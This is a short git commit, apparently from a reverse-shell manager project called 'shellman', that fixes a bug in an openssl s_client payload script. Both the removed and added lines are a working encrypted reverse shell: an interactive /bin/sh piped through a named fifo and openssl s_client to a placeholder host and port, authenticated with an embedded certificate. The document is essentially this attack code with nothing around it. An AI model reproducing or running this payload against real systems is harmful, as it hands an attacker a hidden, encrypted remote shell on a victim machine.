cad3c151bb025fd19d97f87a2940526cce74048b
goeo_ <me@goeo.pink>
2020-04-28 10:41:32 +0200

    whoops forgot a /tmp/s there

--- shellman/payloads/openssl_sclient_payload.sh
+++ shellman/payloads/openssl_sclient_payload.sh
@@ -3,6 +3,6 @@ cat <<EOF >"$cert"
 CERTHERE
 EOF
 shell=$(mktemp -u)
-mkfifo "$shell"; /bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect HOSTHERE:PORTHERE -CAfile "$cert" >"$shell"
+mkfifo "$shell"; /bin/sh -i <"$shell" 2>&1 | openssl s_client -quiet -connect HOSTHERE:PORTHERE -CAfile "$cert" >"$shell"
 rm "$shell"
 rm "$cert"
